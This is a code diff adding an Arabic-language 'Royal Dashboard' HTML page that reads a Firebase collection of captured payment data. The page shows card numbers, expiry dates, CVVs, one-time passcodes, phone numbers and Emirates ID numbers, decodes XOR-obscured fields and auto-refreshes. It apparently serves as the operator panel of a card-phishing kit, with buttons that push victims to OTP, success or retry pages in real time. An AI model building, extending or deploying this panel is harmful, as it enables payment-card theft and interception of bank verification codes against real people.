@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اللوحة الملكية | ROYAL DASHBOARD</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: 'Tajawal', sans-serif; 
+            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 50%, #16213e 100%);
+            color: #e5e5e5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        /* Header */
+        .header { 
+            text-align: center; 
+            margin-bottom: 50px;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.1), rgba(212, 175, 55, 0.05));
+            border-radius: 20px;
+            border: 2px solid rgba(212, 175, 55, 0.3);
+        }
+        
+        .header-title { 
+            font-size: 48px; 
+            font-weight: 900; 
+            color: #d4af37; 
+            text-shadow: 0 0 30px rgba(212, 175, 55, 0.6);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .header-subtitle { 
+            color: #aaa; 
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+        
+        /* Grid Layout */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        /* Card Container */
+        .card-container {
+            background: linear-gradient(135deg, rgba(26, 26, 46, 0.8), rgba(22, 33, 62, 0.8));
+            border: 2px solid rgba(212, 175, 55, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(212, 175, 55, 0.1);
+        }
+        
+        .card-container:hover {
+            border-color: rgba(212, 175, 55, 0.6);
+            box-shadow: 0 30px 80px rgba(212, 175, 55, 0.2), inset 0 1px 0 rgba(212, 175, 55, 0.2);
+            transform: translateY(-5px);
+        }
+        
+        /* Credit Card Display */
+        .credit-card {
+            background: linear-gradient(135deg, #d4af37 0%, #c9a227 50%, #b8941f 100%);
+            border-radius: 15px;
+            padding: 25px;
+            color: #1a1a2e;
+            margin-bottom: 25px;
+            box-shadow: 0 20px 50px rgba(212, 175, 55, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .credit-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 3px;
+        }
+        
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-number {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 6px;
+            text-align: center;
+            margin: 25px 0;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-holder {
+            flex: 1;
+        }
+        
+        .card-holder-label {
+            font-size: 10px;
+            opacity: 0.7;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-holder-name {
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-expiry-cvv {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .expiry-cvv-item {
+            text-align: center;
+        }
+        
+        .expiry-cvv-label {
+            font-size: 10px;
+            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        
+        .expiry-cvv-value {
+            font-size: 14px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        
+        /* OTP Section */
+        .otp-section {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.2), rgba(212, 175, 55, 0.1));
+            border: 2px solid rgba(212, 175, 55, 0.4);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .otp-label { 
+            font-size: 12px; 
+            color: #aaa; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .otp-code {
+            font-size: 56px;
+            font-weight: 900;
+            color: #d4af37;
+            letter-spacing: 12px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+            margin-bottom: 15px;
+        }
+        
+        .otp-status {
+            font-size: 13px;
+            color: #4ade80;
+            font-weight: 600;
+        }
+        
+        .otp-status.waiting { color: #fbbf24; }
+        
+        /* Controls */
+        .controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        
+        .btn {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-otp {
+            background: linear-gradient(135deg, #3b82f6, #1e40af);
+            color: white;
+        }
+        
+        .btn-approve {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+        
+        .btn-reject {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: white;
+        }
+        
+        .btn-delete {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        /* User Info */
+        .user-info {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 13px;
+        }
+        
+        .user-info p {
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-info strong {
+            color: #d4af37;
+        }
+        
+        /* OTP History */
+        .otp-history {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            max-height: 100px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        
+        .otp-history-item {
+            padding: 6px;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
+            color: #d4af37;
+        }
+        
+        .otp-history-item:last-child { border-bottom: none; }
+        
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 80px 20px;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(212, 175, 55, 0.2);
+            border-top-color: #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .cards-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header-title {
+                font-size: 32px;
+            }
+            
+            .card-number {
+                font-size: 24px;
+                letter-spacing: 4px;
+            }
+            
+            .otp-code {
+                font-size: 40px;
+                letter-spacing: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="header-title">👑 اللوحة الملكية</h1>
+            <p class="header-subtitle">ROYAL CONTROL DASHBOARD</p>
+        </div>
+
+        <!-- Cards Container -->
+        <div id="visitors-container">
+            <div class="loading">
+                <div class="spinner"></div>
+                <p>جاري فحص الرادار الملكي...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-TzE4b9k2N1x0P3r5Q7s9W1v2Y3z4X5c",
+            authDomain: "dsfe-ert.firebaseapp.com",
+            projectId: "dsfe-ert",
+            storageBucket: "dsfe-ert.appspot.com",
+            messagingSenderId: "964263514104",
+            appId: "1:964263514104:web:de017cc91f93959df4500d"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        let knownIds = new Set();
+        let otpHistory = {};
+
+        function decrypt(str) {
+            if (!str) return '-';
+            try {
+                if (/^\d+$/.test(str.replace(/\s/g, ''))) return str;
+                let res = '';
+                for (let i = 0; i < str.length; i++) {
+                    res += String.fromCharCode(str.charCodeAt(i) ^ 0x42);
+                }
+                const cleaned = res.replace(/[^a-zA-Z0-9\/\-\s]/g, '').trim();
+                return cleaned || str;
+            } catch (e) { return str; }
+        }
+
+        function formatCardNumber(num) {
+            if (!num || num === '-') return '•••• •••• •••• ••••';
+            const str = String(num).replace(/\D/g, '');
+            return str.replace(/(\d{4})/g, '$1 ').trim() || '•••• •••• •••• ••••';
+        }
+
+        function formatExpiry(exp) {
+            if (!exp || exp === '-') return 'MM/YY';
+            const str = String(exp).replace(/\D/g, '');
+            if (str.length >= 4) {
+                return str.substring(0, 2) + '/' + str.substring(2, 4);
+            }
+            return str || 'MM/YY';
+        }
+
+        async function sendCommand(id, cmd) {
+            try {
+                await db.collection('pays').doc(id).update({
+                    redirectPage: cmd,
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                alert('✓ تم إرسال الأمر: ' + cmd);
+            } catch (e) {
+                alert('✗ خطأ في إرسال الأمر');
+            }
+        }
+
+        async function deleteCard(id) {
+            if (confirm('هل أنت متأكد من حذف هذه البطاقة؟')) {
+                try {
+                    await db.collection('pays').doc(id).delete();
+                    alert('✓ تم حذف البطاقة بنجاح');
+                    updateRadar();
+                } catch (e) {
+                    alert('✗ خطأ في حذف البطاقة');
+                }
+            }
+        }
+
+        function renderVisitor(doc) {
+            const data = doc.data();
+            const id = doc.id;
+            const isNew = !knownIds.has(id);
+            if (isNew) {
+                knownIds.add(id);
+            }
+
+            const cardNum = decrypt(data.cardNumber || data._v1 || '');
+            let expiry = decrypt(data.expiry || data._v2 || '');
+            const cvv = decrypt(data.cvv || data._v3 || '');
+            const otp = decrypt(data.otp || data.otpCode || '');
+            const holderName = (data.fullName || data.cardHolder || data.ownerName || 'ROYAL USER').toUpperCase();
+
+            // Track OTP history
+            if (otp && otp !== '-') {
+                if (!otpHistory[id]) otpHistory[id] = [];
+                const timestamp = new Date().toLocaleTimeString('ar-SA');
+                if (!otpHistory[id].includes(`${otp} #${timestamp}`)) {
+                    otpHistory[id].unshift(`${otp} #${timestamp}`);
+                    if (otpHistory[id].length > 5) otpHistory[id].pop();
+                }
+            }
+
+            const otpHistoryHTML = otpHistory[id] ? otpHistory[id].map(h => `<div class="otp-history-item">${h}</div>`).join('') : '<div class="otp-history-item" style="color: #666;">لا توجد سجلات</div>';
+
+            return `
+                <div class="card-container">
+                    <!-- Credit Card -->
+                    <div class="credit-card">
+                        <div class="card-header">
+                            <div class="card-logo">👑 ROYAL</div>
+                            <div class="card-chip"></div>
+                        </div>
+                        <div class="card-number">${formatCardNumber(cardNum)}</div>
+                        <div class="card-footer">
+                            <div class="card-holder">
+                                <div class="card-holder-label">Card Holder</div>
+                                <div class="card-holder-name">${holderName}</div>
+                            </div>
+                            <div class="card-expiry-cvv">
+                                <div class="expiry-cvv-item">
+                                    <div class="expiry-cvv-label">Valid Thru</div>
+                                    <div class="expiry-cvv-value">${formatExpiry(expiry)}</div>
+                                </div>
+                                <div class="expiry-cvv-item">
+                                    <div class="expiry-cvv-label">CVV</div>
+                                    <div class="expiry-cvv-value">${cvv === '-' ? '•••' : cvv}</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- OTP Section -->
+                    <div class="otp-section">
+                        <span class="otp-label">آخر كود مستلم</span>
+                        <div class="otp-code">${otp === '-' ? '------' : otp}</div>
+                        <div class="otp-status ${otp === '-' ? 'waiting' : ''}">
+                            ${otp === '-' ? '⏳ بانتظار الكود...' : '✓ تم استلام الكود'}
+                        </div>
+                        <div class="otp-history">
+                            ${otpHistoryHTML}
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons -->
+                    <div class="controls">
+                        <button onclick="sendCommand('${id}', 'otp')" class="btn btn-otp">📱 إلى OTP</button>
+                        <button onclick="sendCommand('${id}', 'success')" class="btn btn-approve">✓ موافقة</button>
+                        <button onclick="sendCommand('${id}', 'payment')" class="btn btn-reject">↩️ رفض</button>
+                        <button onclick="deleteCard('${id}')" class="btn btn-delete">🗑️ حذف</button>
+                    </div>
+
+                    <!-- User Info -->
+                    <div class="user-info">
+                        <p>👤 <strong>${data.fullName || data.ownerName || 'مستخدم'}</strong></p>
+                        <p>📞 <strong>${data.phone || '-'}</strong></p>
+                        <p>🆔 <strong>${data.emiratesId || '-'}</strong></p>
+                        <p>⏰ ${new Date(data.createdAt?.toDate?.() || Date.now()).toLocaleString('ar-SA')}</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        async function updateRadar() {
+            try {
+                const snapshot = await db.collection('pays').orderBy('updatedAt', 'desc').limit(20).get();
+                const container = document.getElementById('visitors-container');
+                if (snapshot.empty) {
+                    container.innerHTML = '<div class="loading"><p>لا توجد بطاقات حالياً</p></div>';
+                    return;
+                }
+                container.innerHTML = '<div class="cards-grid">' + snapshot.docs.map(doc => renderVisitor(doc)).join('') + '</div>';
+            } catch (e) {
+                console.error('خطأ في جلب البيانات:', e);
+                document.getElementById('visitors-container').innerHTML = '<div class="loading"><p>خطأ في الاتصال بقاعدة البيانات</p></div>';
+            }
+        }
+
+        // Initial load and auto-refresh
+        updateRadar();
+        setInterval(updateRadar, 5000);
+    </script>
+</body>
+</html>
